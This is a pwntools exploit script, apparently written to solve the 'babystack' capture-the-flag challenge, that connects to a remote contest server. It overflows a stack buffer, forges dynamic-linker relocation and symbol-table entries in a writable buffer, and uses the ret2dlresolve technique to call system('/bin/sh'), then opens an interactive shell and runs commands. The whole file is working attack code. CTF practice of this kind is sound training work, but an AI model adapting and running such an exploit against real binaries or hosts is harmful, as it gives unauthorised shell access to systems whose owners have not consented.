from pwn import *

context.binary = ("./babystack")

#p = process("./babystack")
p = remote("babystack.problem.cscctf.com", 11111)

def exploit():                
    padding = 20
    vuln_addr = 0x08048456
    read_plt = 0x8048300
    buff = 0x0804a100

    RESOLVER = 0x80482f0
    JMPREL = 0x80482b0
    SYMTAB = 0x80481cc
    STRTAB = 0x804822c

    # Trigger vulnerability so the program can call read function again for twice
    payload = ""
    payload += "A" * padding
    payload += p32(read_plt)
    payload += p32(vuln_addr)
    payload += p32(0x0)
    payload += p32(buff)
    payload += p32(0x100)

    # gdb.attach(p, '''
    #             b *vuln
    #             c
    #             ''')

    p.sendline(payload)

    # Create fake data structure for JMPREL and SYMTAB
    # Fake JMPREL
    data_structure = ""
    data_structure += p32(buff) # r_offset
    data_structure += p32((((buff + 12 - SYMTAB) / 16) << 8) | 0x7)# r_info
    data_structure += "JUNK" # padding
    # Fake SYMTAB
    data_structure += p32(buff + 28 - STRTAB)# st_name
    data_structure += p32(0x0) # st_value
    data_structure += p32(0x0) # st_size
    data_structure += p32(0x0) # st_info
    data_structure += "system".ljust(8, "\x00") # system string
    data_structure += "/bin/sh".ljust(8, "\x00") # /bin/sh string

    # gdb.attach(p, '''
    #             b *vuln+31
    #             b *vuln+45
    #             c
    #             ''')

    p.sendline(data_structure)

    payload = ""
    payload += "A" * padding
    payload += p32(RESOLVER)
    payload += p32(buff - JMPREL)
    payload += "JUNK"
    payload += p32(buff + 36)

    p.sendline(payload)
    p.sendline("ls -lah && whoami")
    p.interactive()

if __name__ == "__main__":
    exploit()
